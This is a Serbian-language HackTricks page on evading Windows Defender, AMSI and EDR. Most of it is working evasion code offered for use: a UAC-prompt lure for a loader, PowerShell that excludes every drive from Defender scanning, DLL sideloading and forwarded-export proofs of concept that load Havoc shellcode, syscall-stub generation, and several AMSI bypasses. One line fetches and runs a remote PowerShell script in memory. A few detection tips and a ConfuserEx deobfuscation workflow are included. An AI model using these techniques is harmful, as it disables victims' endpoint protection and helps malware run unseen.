# Zaobilaženje antivirusne zaštite (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defendera tako što lažira drugi AV.
- [Onemogućavanje Defendera ako ste administrator](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalatora pre diranja Defendera

Javni loaderi koji se predstavljaju kao varalice za igre često se isporučuju kao nepotpisani Node.js/Nexe instalatori koji prvo **zatraže od korisnika povišene privilegije**, a tek zatim onesposobe Defender. Postupak je jednostavan:

1. Proverite da li je kontekst administratorski pomoću komande `net session`. Komanda uspeva samo kada pozivalac ima administratorska prava, pa neuspeh znači da se loader pokreće kao običan korisnik.
2. Odmah ga ponovo pokrenite pomoću glagola `RunAs` da bi se prikazao očekivani UAC upit za potvrdu, uz očuvanje originalne komandne linije.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Žrtve već veruju da instaliraju „crackovan“ softver, pa obično prihvate upit, čime malware dobija potrebna prava da promeni Defender-ovu politiku.<sup>[[26]](#references)</sup>

### Blanket `MpPreference` exclusions for every drive letter

Kada dobije povišene privilegije, lanci nalik GachiLoader-u maksimalno iskorišćavaju slepe tačke Defender-a, umesto da potpuno isključe servis. Loader najpre gasi GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a zatim dodaje **izuzetno široka izuzeća** kako bi svaki korisnički profil, sistemski direktorijum i prenosivi disk postali nedostupni za skeniranje:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ključna zapažanja:

- Petlja prolazi kroz svaki montirani sistem datoteka (D:\, E:\, USB memorije itd.), tako da se **svaki budući payload sačuvan bilo gde na disku ignoriše**.
- Isključivanje ekstenzije `.sys` unapred ostavlja napadačima mogućnost da kasnije učitavaju nepotpisane drajvere bez ponovnog menjanja Defendera.
- Sve izmene se upisuju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da su izuzeci sačuvani ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto se nijedna Defender usluga ne zaustavlja, naivne provere ispravnosti i dalje prijavljuju da je „antivirus aktivan“, iako zaštita u realnom vremenu nikada ne proverava te putanje.<sup>[[26]](#references)</sup>

## **Metodologija izbegavanja AV-a**

Trenutno AV alati koriste različite metode za proveru da li je datoteka zlonamerna: statičku detekciju, dinamičku analizu i, kod naprednijih EDR-ova, analizu ponašanja.

### **Statička detekcija**

Statička detekcija se postiže označavanjem poznatih zlonamernih nizova ili nizova bajtova u binarnoj datoteci ili skripti, kao i izvlačenjem informacija iz same datoteke (npr. opisa datoteke, naziva kompanije, digitalnih potpisa, ikone, kontrolne sume itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do otkrivanja, jer su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da se zaobiđe ovakva detekcija:

- **Šifrovanje**

Ako šifrujete binarnu datoteku, AV neće moći da detektuje vaš program, ali će vam trebati neka vrsta loadera koji će ga dešifrovati i pokrenuti u memoriji.

- **Obfuskacija**

Ponekad je dovoljno samo da izmenite neke nizove u binarnoj datoteci ili skripti kako biste prošli AV proveru, ali to može da oduzme dosta vremena, u zavisnosti od toga šta pokušavate da obfuskujete.

- **Pravljenje sopstvenih alata**

Ako razvijate sopstvene alate, neće postojati poznati loši potpisi, ali za to je potrebno mnogo vremena i truda.

> [!TIP]
> Dobar alat za proveru statičke detekcije Windows Defendera je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On deli datoteku na više segmenata i zatim traži od Defendera da svaki od njih skenira pojedinačno. Tako može tačno da vam pokaže koji su nizovi ili bajtovi u binarnoj datoteci označeni.

Toplo preporučujem da pogledate ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom izbegavanju AV-a.

### **Dinamička analiza**

Dinamička analiza je kada AV pokrene vašu binarnu datoteku u sandboxu i prati zlonamerne aktivnosti (npr. pokušaj dešifrovanja i čitanja lozinki iz pregledača, pravljenje minidump-a procesa LSASS itd.). Ovo može biti malo komplikovanije, ali evo nekoliko stvari koje možete da uradite da biste izbegli sandboxe.

- **Sačekajte pre izvršavanja** U zavisnosti od načina implementacije, ovo može biti odličan način za zaobilaženje dinamičke analize AV-a. AV alati imaju vrlo malo vremena za skeniranje datoteka kako ne bi ometali korisnikov rad, pa duga čekanja mogu da poremete analizu binarnih datoteka. Problem je u tome što mnogi AV sandboxi mogu jednostavno da preskoče čekanje, u zavisnosti od načina implementacije.
- **Provera resursa računara** Sandboxi obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli da uspore računar korisnika. Ovde možete da budete i veoma kreativni, na primer, da proverite temperaturu CPU-a ili čak brzinu ventilatora; sandbox neće moći da simulira baš sve.
- **Provere specifične za računar** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu „contoso.local“, možete da proverite domen računara i vidite da li se poklapa sa onim koji ste naveli. Ako se ne poklapa, program može da se zatvori.

Ispostavlja se da se računar u sandboxu Microsoft Defendera zove HAL9TH, pa možete da proverite naziv računara u svom malware-u pre detekcije. Ako se naziv poklapa sa HAL9TH, to znači da ste u Defender sandboxu i program može da se zatvori.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za zaobilaženje sandboxa

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanal #malware-dev</p></figcaption></figure>

Kao što smo već rekli u ovom postu, **javni alati** će na kraju **biti detektovani**, pa bi trebalo da se zapitate:

Na primer, ako želite da napravite dump LSASS-a, **da li zaista morate da koristite mimikatz**? Ili biste mogli da upotrebite neki manje poznat projekat koji takođe pravi dump LSASS-a?

Verovatno je bolji ovaj drugi izbor. Uzmimo mimikatz za primer: to je verovatno jedan od najčešće označavanih malware alata, ako ne i najčešće označavani, u AV-ovima i EDR-ovima. Iako je sam projekat odličan, veoma je teško koristiti ga za zaobilaženje AV-a, pa jednostavno potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada menjate payload-e radi izbegavanja detekcije, obavezno **isključite automatsko slanje uzoraka** u Defenderu i, molim vas, ozbiljno, **NEMOJTE OTPREMATI NA VIRUSTOTAL** ako vam je cilj dugoročno izbegavanje detekcije. Ako želite da proverite da li određeni AV detektuje vaš payload, instalirajte ga na virtuelnu mašinu, pokušajte da isključite automatsko slanje uzoraka i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXE datoteke naspram DLL datoteka

Kad god je moguće, uvek **dajte prednost DLL datotekama radi izbegavanja detekcije**. Prema mom iskustvu, DLL datoteke se obično **mnogo ređe detektuju** i analiziraju, pa je ovo jednostavan trik koji u nekim slučajevima može da pomogne u izbegavanju detekcije (naravno, ako vaš payload može da se pokrene kao DLL).

Kao što vidimo na ovoj slici, DLL payload iz Havoc-a ima stopu detekcije 4/26 na antiscan.me, dok EXE payload ima stopu detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>poređenje na antiscan.me između uobičajenog Havoc EXE payload-a i uobičajenog Havoc DLL-a</p></figcaption></figure>

Sada ćemo prikazati nekoliko trikova koje možete da koristite sa DLL datotekama kako biste bili mnogo neprimetniji.

## DLL Sideloading & Proxying

**DLL Sideloading** iskorišćava redosled pretrage DLL-ova koji koristi loader tako što se ranjiva aplikacija i zlonamerni payload-i smeste jedan pored drugog.

Možete da pronađete programe podložne DLL Sideloading-u pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledeće PowerShell skripte:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ova komanda će prikazati listu programa u direktorijumu "C:\Program Files\\" koji su podložni DLL hijacking-u, kao i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **samostalno istražite programe podložne DLL Hijackingu/Sideloadingu**. Ova tehnika je prilično neupadljiva kada se pravilno primeni, ali ako koristite javno poznate programe podložne DLL Sideloadingu, lako možete biti otkriveni.

Samo postavljanje zlonamernog DLL-a sa imenom koje program očekuje neće pokrenuti vaš payload, jer program očekuje da DLL sadrži određene funkcije. Da bismo rešili ovaj problem, koristićemo drugu tehniku pod nazivom **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje sa proxy (i zlonamernog) DLL-a na originalni DLL, čime se čuva funkcionalnost programa i omogućava pokretanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Evo koraka koje sam pratio:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (kodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! Rekao bih da je ovo uspeh.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sShit-ov Twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE), kako biste saznali više o onome o čemu smo razgovarali, uz više detalja.

### Zloupotreba prosleđenih izvoza (ForwardSideLoading)

Windows PE moduli mogu da izvoze funkcije koje su zapravo „prosleđivači“: umesto da pokazuju na kod, unos izvoza sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivalac razreši izvoz, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Važno ponašanje koje treba razumeti:
- Ako je `TargetDll` KnownDLL, učitava se iz zaštićenog KnownDLLs imenskog prostora (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji obuhvata direktorijum modula koji obavlja prosleđivanje.

Ovo omogućava primitivu za indirektni sideloading: pronađite potpisani DLL koji izvozi funkciju prosleđenu modulu koji nije KnownDLL, a zatim smestite taj potpisani DLL u isti direktorijum sa DLL-om pod kontrolom napadača, čije ime tačno odgovara nazivu ciljnog prosleđenog modula. Kada se pozove prosleđena funkcija, loader razrešava prosleđivanje i učitava vaš DLL iz istog direktorijuma, čime se izvršava vaš DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen u Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nije KnownDLL, pa se razrešava prema uobičajenom redosledu pretrage.

PoC (kopiraj-nalepi):
1) Kopirajte potpisani sistemski DLL u fasciklu u koju je moguće pisati.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u isti folder. Minimalni DllMain je dovoljan za izvršavanje koda; ne morate da implementirate prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Aktivirajte prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader prati prosleđivanje do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, greška „missing API“ pojaviće se tek nakon što je `DllMain` već pokrenut

Hunting tips:
- Fokusirajte se na prosleđene exporte kod kojih ciljni modul nije KnownDLL. KnownDLL-ovi su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Prosleđene exporte možete nabrojati pomoću alata kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar forwardera za Windows 11 da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove sa putanja koje nisu sistemske, a zatim učitavaju DLL-ove koji nisu KnownDLLs, ali imaju isto osnovno ime, iz tog direktorijuma
- Upozorite na lance procesa/modula kao što je: `rundll32.exe` → nesistemski `keyiso.dll` → `NCRYPTPROV.dll` unutar putanja u koje korisnik može da upisuje
- Sprovodite smernice za integritet koda (WDAC/AppLocker) i zabranite upisivanje i izvršavanje u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je alat za payload-e za zaobilaženje EDR-ova korišćenjem suspendovanih procesa, direktnih syscalls i alternativnih metoda izvršavanja`

Freeze možete koristiti za učitavanje i izvršavanje svog shellcode-a na prikriven način.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evazija je samo igra mačke i miša: ono što funkcioniše danas može biti otkriveno sutra, zato se nikada ne oslanjajte samo na jedan alat. Ako je moguće, pokušajte da povežete više tehnika evazije.

## Direct/Indirect Syscalls & razrešavanje SSN-a (SysWhispers4)

EDR-ovi često postavljaju **inline hooks u korisničkom režimu** na syscall stubove u `ntdll.dll`. Da biste zaobišli te hooks, možete generisati **direct** ili **indirect** syscall stubove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel režim bez izvršavanja zakačene export entrypoint funkcije.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (ugrađen)**: emituje instrukciju `syscall`/`sysenter`/`SVC #0` u generisanom stubu (ne pristupa se exportu iz `ntdll`).
- **Indirect**: skače na postojeći `syscall` gadget unutar `ntdll`, tako da izgleda kao da prelaz u kernel potiče iz `ntdll` (korisno za izbegavanje heurističke detekcije); **randomized indirect** bira gadget iz grupe za svaki poziv.
- **Egg-hunt**: izbegava ugrađivanje statičnog niza opkoda `0F 05` na disk; pronalazi syscall sekvencu tokom izvršavanja.

**Strategije za razrešavanje SSN-a otporne na hooks:**
- **FreshyCalls (VA sort)**: zaključuje SSN-ove sortiranjem syscall stubova po virtuelnoj adresi, umesto čitanjem bajtova stubova.
- **SyscallsFromDisk**: mapira čistu `\KnownDlls\ntdll.dll`, čita SSN-ove iz njenog odeljka `.text`, a zatim je odmapira (zaobilazi sve hooks u memoriji).
- **RecycledGate**: kombinuje zaključivanje SSN-a sortiranjem po VA sa proverom opkoda kada je stub čist; ako je zakačen, vraća se na zaključivanje na osnovu VA.
- **HW Breakpoint**: postavlja DR0 na instrukciju `syscall` i koristi VEH da tokom izvršavanja uhvati SSN iz `EAX`, bez parsiranja zakačenih bajtova.

Primer upotrebe SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči „[malware bez datoteka](https://en.wikipedia.org/wiki/Fileless_malware)“. U početku su AV rešenja mogla da skeniraju samo **datoteke na disku**, pa ako biste nekako mogli da izvršite payload **direktno u memoriji**, AV ne bi mogao ništa da uradi da to spreči, jer ne bi imao dovoljno uvida.

AMSI funkcija je integrisana u sledeće Windows komponente.

- Kontrola korisničkog naloga, odnosno UAC (povišavanje privilegija za EXE, COM, MSI ili ActiveX instalaciju)
- PowerShell (skripte, interaktivna upotreba i dinamičko izvršavanje koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Omogućava antivirusnim rešenjima da pregledaju ponašanje skripti tako što izlaže njihov sadržaj u nešifrovanom i neobfuskovanom obliku.

Pokretanje komande `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` izazvaće sledeće upozorenje u programu Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako dodaje prefiks `amsi:`, a zatim putanju do izvršne datoteke iz koje je skripta pokrenuta — u ovom slučaju, powershell.exe.

Nismo sačuvali nijednu datoteku na disk, ali smo ipak otkriveni u memoriji zbog AMSI-ja.

Štaviše, počevši od verzije **.NET 4.8**, C# kod se takođe proverava kroz AMSI. To utiče čak i na `Assembly.Load(byte[])` za učitavanje koda koji se izvršava u memoriji. Zato se za izvršavanje u memoriji preporučuje korišćenje starijih verzija .NET-a (kao što je 4.7.2 ili starija) ako želite da izbegnete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuskacija**

Pošto se AMSI uglavnom oslanja na statičko otkrivanje, izmena skripti koje pokušavate da učitate može biti dobar način da izbegnete otkrivanje.

Međutim, AMSI može da deobfuskuje skripte čak i ako imaju više slojeva obfuskacije, pa obfuskacija može biti loš izbor, u zavisnosti od načina na koji je izvedena. Zbog toga izbegavanje otkrivanja nije baš jednostavno. Ipak, ponekad je dovoljno promeniti nekoliko naziva promenljivih, pa sve zavisi od toga koliko je nešto označeno kao sumnjivo.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell-a (kao i cscript.exe, wscript.exe itd.), moguće je lako menjati ga čak i kada se izvršava kao neprivilegovani korisnik. Zbog ovog nedostatka u implementaciji AMSI-ja, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Izazivanje greške**

Izazivanje neuspeha AMSI inicijalizacije (amsiInitFailed) znači da se skeniranje neće pokrenuti za trenutni proces. O ovome je prvobitno izvestio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio potpis kako bi sprečio širu upotrebu.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bila je potrebna samo jedna linija PowerShell koda da AMSI učini neupotrebljivim u trenutnom PowerShell procesu. Naravno, samu liniju je označio AMSI, pa je potrebno izmeniti je da bi se ova tehnika koristila.

Evo izmenjenog AMSI bypass koda koji sam preuzeo iz ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Imajte na umu da će ovo verovatno biti označeno kada objava bude objavljena, zato ne bi trebalo da objavljujete nikakav kod ako vam je cilj da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/). Ona podrazumeva pronalaženje adrese funkcije „AmsiScanBuffer“ u amsi.dll (odgovorne za skeniranje unosa koji je dostavio korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Tako se dobija rezultat 0 pri stvarnom skeniranju, što se tumači kao čist rezultat.

> [!TIP]
> Za detaljnije objašnjenje pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/).

Postoje i mnoge druge tehnike za zaobilaženje AMSI-ja pomoću PowerShell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robusno rešenje koje ne zavisi od programskog jezika jeste postavljanje hook-a u korisničkom režimu na `ntdll!LdrLoadDll`, koji vraća grešku kada je traženi modul `amsi.dll`. Zbog toga se AMSI никad ne učitava i u tom procesu se ne vrše skeniranja.<sup>[[23]](#references)</sup>

Osnovni nacrt implementacije (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Napomene
- Radi u PowerShell-u, WScript/CScript i prilagođenim loader-ima (u svemu što bi inače učitalo AMSI).
- Kombinujte ga sa prosleđivanjem skripti preko stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli tragove dugih komandnih linija.
- Zabeležena je upotreba u loader-ima koje izvršavaju LOLBin-ovi (npr. `regsvr32` poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše skripte za zaobilaženje AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše skripte za zaobilaženje AMSI-ja, koje izbegavaju signature pomoću nasumično generisane korisnički definisane funkcije, promenljivih i izraza znakova, a nasumično menjaju i velika i mala slova u PowerShell ključnim rečima kako bi izbegle signature.

**Uklonite detektovanu signaturu**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da biste uklonili detektovanu AMSI signaturu iz memorije trenutnog procesa. Ovaj alat skenira memoriju trenutnog procesa u potrazi za AMSI signaturom, a zatim je zamenjuje NOP instrukcijama, čime je efektivno uklanja iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Listu AV/EDR proizvoda koji koriste AMSI možete pronaći na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Koristite PowerShell verziju 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa skripte možete pokretati bez AMSI skeniranja. To možete da uradite ovako:

```bash
powershell.exe -version 2
```

## PS evidentiranje

PowerShell evidentiranje je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. Ovo može biti korisno u svrhe revizije i rešavanja problema, ali može predstavljati i **problem za napadače koji žele da izbegnu otkrivanje**.

Da biste zaobišli PowerShell evidentiranje, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Koristite PowerShell verziju 2**: Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako: `powershell.exe -version 2`
- **Koristite unmanaged PowerShell sesiju**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) za hostovanje PowerShell-a bez pokretanja `powershell.exe` (pristup koji koristi `powerpick` alata Cobalt Strike). Time se zaobilaze kontrole vezane konkretno za proces `powershell.exe`, ali se time ne onemogućavaju automatski AMSI, Script Block Logging niti sve druge PowerShell odbrane; obuhvat zavisi od runtime-a i implementacije hosta.


## Obfuskacija

> [!TIP]
> Nekoliko tehnika obfuskacije oslanja se na šifrovanje podataka, što će povećati entropiju binarne datoteke i olakšati AV-ovima i EDR-ovima da je otkriju. Budite oprezni i možda primenite šifrovanje samo na određene delove koda koji su osetljivi ili koje treba sakriti.

### Deobfuskacija .NET binarnih datoteka zaštićenih alatom ConfuserEx

Prilikom analiziranja malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove), često se nailazi na nekoliko slojeva zaštite koji će blokirati dekompilatore i sandbox okruženja. Tok rada u nastavku pouzdano **vraća IL gotovo u originalno stanje**, nakon čega se može dekompilirati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1.  Uklanjanje zaštite od neovlašćenih izmena – ConfuserEx šifruje svako *telo metode* i dešifruje ga unutar statičkog konstruktora *modula* (`<Module>.cctor`). Takođe menja PE checksum, pa će svaka izmena izazvati rušenje binarne datoteke. Koristite **AntiTamperKiller** da pronađete šifrovane tabele metapodataka, povratite XOR ključeve i ponovo napravite čisti assembly:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni pri izradi sopstvenog unpacker-a.

2.  Rekonstrukcija simbola / toka kontrole – prosledite *clean* fajl programu **de4dot-cex** (fork programa de4dot koji prepoznaje ConfuserEx).
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Zastavice:
     • `-p crx` – izaberite profil ConfuserEx 2
     • de4dot će poništiti spljoštavanje toka kontrole, vratiti originalne prostore imena, klase i nazive promenljivih i dešifrovati konstantne stringove.

3.  Uklanjanje proxy poziva – ConfuserEx zamenjuje direktne pozive metoda laganim omotačima (poznatim i kao *proxy pozivi*) kako bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Nakon ovog koraka trebalo bi da vidite uobičajene .NET API-je, kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite dobijeni binarni fajl u dnSpy-ju i potražite velike Base64 blobove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste pronašli *pravi* payload. Malware ga često čuva kao TLV-kodirani niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Gornji lanac obnavlja tok izvršavanja **bez** potrebe da pokrenete zlonamerni uzorak – korisno pri radu na offline radnoj stanici.

